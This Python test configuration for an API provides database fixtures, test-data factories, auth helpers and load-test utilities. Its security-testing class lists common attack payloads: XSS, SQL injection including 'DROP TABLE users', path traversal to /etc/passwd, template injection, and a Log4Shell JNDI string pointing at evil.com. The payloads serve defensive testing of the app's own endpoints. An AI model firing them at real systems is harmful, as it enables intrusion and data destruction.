"""
Comprehensive Test Configuration for Plinto API
Production-ready test infrastructure with 85%+ coverage targets
"""

import os
import asyncio
import pytest
from typing import AsyncGenerator, Generator, Any

import structlog
from httpx import AsyncClient
from sqlalchemy import create_engine
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy.pool import StaticPool

from app.main import app
from app.config import settings
from app.models import Base
from app.core.database_manager import db_manager
from app.core.jwt_manager import jwt_manager

# Configure test logging
structlog.configure(
    processors=[structlog.dev.ConsoleRenderer()],
    logger_factory=structlog.stdlib.LoggerFactory(),
    wrapper_class=structlog.stdlib.BoundLogger,
    cache_logger_on_first_use=True,
)

# Test database configuration
TEST_DATABASE_URL = "sqlite+aiosqlite:///:memory:"


class TestConfig:
    """Test configuration and utilities"""

    def __init__(self):
        self.test_engine = None
        self.test_session_local = None
        self._initialized = False

    async def setup_test_database(self):
        """Setup in-memory test database"""
        if self._initialized:
            return

        # Create async test engine
        self.test_engine = create_async_engine(
            TEST_DATABASE_URL,
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
            echo=False,  # Set to True for SQL debugging
        )

        # Create all tables
        async with self.test_engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

        # Create session maker
        self.test_session_local = async_sessionmaker(
            bind=self.test_engine,
            class_=AsyncSession,
            expire_on_commit=False,
            autoflush=False,
            autocommit=False,
        )

        self._initialized = True

    async def get_test_session(self) -> AsyncSession:
        """Get a test database session"""
        if not self._initialized:
            await self.setup_test_database()

        return self.test_session_local()

    async def cleanup_test_database(self):
        """Clean up test database"""
        if self.test_engine:
            await self.test_engine.dispose()
            self._initialized = False


# Global test config
test_config = TestConfig()


# Pytest fixtures
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    policy = asyncio.get_event_loop_policy()
    loop = policy.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
async def setup_test_db():
    """Setup test database for the session"""
    await test_config.setup_test_database()
    yield
    await test_config.cleanup_test_database()


@pytest.fixture
async def db_session(setup_test_db) -> AsyncGenerator[AsyncSession, None]:
    """Provide a database session for each test"""
    session = await test_config.get_test_session()
    try:
        yield session
    finally:
        await session.rollback()
        await session.close()


@pytest.fixture
async def client(db_session: AsyncSession) -> AsyncGenerator[AsyncClient, None]:
    """Provide an HTTP client with database override"""

    # Override database dependency
    async def override_get_db():
        yield db_session

    app.dependency_overrides[db_session] = override_get_db

    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client

    # Clean up
    app.dependency_overrides.clear()


# Test data factories
class TestDataFactory:
    """Factory for creating test data"""

    @staticmethod
    def create_user_data(
        email: str = "test@example.com",
        password: str = "TestPassword123!",
        name: str = "Test User"
    ) -> dict:
        """Create test user data"""
        return {
            "email": email,
            "password": password,
            "name": name
        }

    @staticmethod
    def create_organization_data(
        name: str = "Test Organization",
        domain: str = "test.com"
    ) -> dict:
        """Create test organization data"""
        return {
            "name": name,
            "domain": domain,
            "settings": {"theme": "light"}
        }

    @staticmethod
    async def create_test_user(db: AsyncSession, **kwargs) -> dict:
        """Create a test user in database"""
        from app.models import User, UserStatus
        import uuid

        user_data = TestDataFactory.create_user_data(**kwargs)

        user = User(
            id=uuid.uuid4(),
            email=user_data["email"],
            name=user_data["name"],
            password_hash="hashed_password",  # Mock hash
            status=UserStatus.ACTIVE,
            email_verified=True
        )

        db.add(user)
        await db.commit()
        await db.refresh(user)

        return {
            "id": str(user.id),
            "email": user.email,
            "name": user.name,
            "user_object": user
        }

    @staticmethod
    def create_jwt_token(user_id: str, email: str = "test@example.com") -> tuple:
        """Create test JWT tokens"""
        access_token, access_jti, access_expires = jwt_manager.create_access_token(
            user_id, email
        )
        refresh_token, refresh_jti, family, refresh_expires = jwt_manager.create_refresh_token(
            user_id
        )

        return access_token, refresh_token, {
            "access_jti": access_jti,
            "refresh_jti": refresh_jti,
            "family": family
        }


# Test utilities
class TestUtils:
    """Utilities for testing"""

    @staticmethod
    async def authenticate_user(client: AsyncClient, email: str = "test@example.com", password: str = "TestPassword123!") -> dict:
        """Authenticate a user and return tokens"""
        # First create the user
        signup_data = {
            "email": email,
            "password": password,
            "name": "Test User"
        }

        signup_response = await client.post("/beta/signup", json=signup_data)
        assert signup_response.status_code == 200

        # Then sign in
        signin_data = {
            "email": email,
            "password": password
        }

        signin_response = await client.post("/beta/signin", json=signin_data)
        assert signin_response.status_code == 200

        return signin_response.json()

    @staticmethod
    def get_auth_headers(access_token: str) -> dict:
        """Get authorization headers"""
        return {"Authorization": f"Bearer {access_token}"}

    @staticmethod
    async def assert_error_response(response, expected_code: str, expected_status: int):
        """Assert error response structure"""
        assert response.status_code == expected_status

        data = response.json()
        assert "error" in data
        assert data["error"]["code"] == expected_code
        assert "message" in data["error"]
        assert "request_id" in data["error"]
        assert "timestamp" in data["error"]


# Mock configurations
class MockConfig:
    """Mock configurations for testing"""

    @staticmethod
    def mock_settings(**overrides):
        """Mock settings with overrides"""
        mock_settings = {
            "ENVIRONMENT": "test",
            "DEBUG": True,
            "DATABASE_URL": TEST_DATABASE_URL,
            "JWT_SECRET_KEY": "test-secret-key",
            "JWT_ALGORITHM": "HS256",
            "ENABLE_DOCS": True,
            "ENABLE_SIGNUPS": True,
            "RATE_LIMIT_ENABLED": False,  # Disable for tests
            **overrides
        }
        return mock_settings


# Performance testing utilities
class PerformanceTestUtils:
    """Utilities for performance testing"""

    @staticmethod
    async def measure_endpoint_performance(client: AsyncClient, endpoint: str, method: str = "GET", **kwargs):
        """Measure endpoint performance"""
        import time

        start_time = time.time()

        if method.upper() == "GET":
            response = await client.get(endpoint, **kwargs)
        elif method.upper() == "POST":
            response = await client.post(endpoint, **kwargs)
        elif method.upper() == "PUT":
            response = await client.put(endpoint, **kwargs)
        elif method.upper() == "DELETE":
            response = await client.delete(endpoint, **kwargs)
        else:
            raise ValueError(f"Unsupported method: {method}")

        end_time = time.time()
        duration_ms = (end_time - start_time) * 1000

        return {
            "response": response,
            "duration_ms": duration_ms,
            "status_code": response.status_code
        }

    @staticmethod
    async def load_test_endpoint(client: AsyncClient, endpoint: str, concurrent_requests: int = 10):
        """Simple load test for endpoint"""
        import asyncio

        async def make_request():
            return await client.get(endpoint)

        # Create concurrent requests
        tasks = [make_request() for _ in range(concurrent_requests)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        successful = len([r for r in responses if not isinstance(r, Exception) and r.status_code < 400])
        failed = len(responses) - successful

        return {
            "total_requests": concurrent_requests,
            "successful": successful,
            "failed": failed,
            "success_rate": successful / concurrent_requests * 100
        }


# Security testing utilities
class SecurityTestUtils:
    """Utilities for security testing"""

    @staticmethod
    def get_malicious_payloads():
        """Common malicious payloads for testing"""
        return [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "../../../../windows/system32/drivers/etc/hosts"
        ]

    @staticmethod
    async def test_sql_injection(client: AsyncClient, endpoint: str, params: dict):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
        ]

        results = []
        for payload in sql_payloads:
            test_params = {k: payload for k in params.keys()}
            response = await client.get(endpoint, params=test_params)
            results.append({
                "payload": payload,
                "status_code": response.status_code,
                "vulnerable": response.status_code == 200 and "error" not in response.text.lower()
            })

        return results

    @staticmethod
    async def test_xss_prevention(client: AsyncClient, endpoint: str, json_data: dict):
        """Test for XSS prevention"""
        xss_payloads = SecurityTestUtils.get_malicious_payloads()[:3]  # Use first 3

        results = []
        for payload in xss_payloads:
            test_data = {k: payload for k in json_data.keys()}
            response = await client.post(endpoint, json=test_data)
            results.append({
                "payload": payload,
                "status_code": response.status_code,
                "response_contains_payload": payload in response.text
            })

        return results


# Export all utilities
__all__ = [
    "TestConfig",
    "TestDataFactory",
    "TestUtils",
    "MockConfig",
    "PerformanceTestUtils",
    "SecurityTestUtils",
    "test_config"
]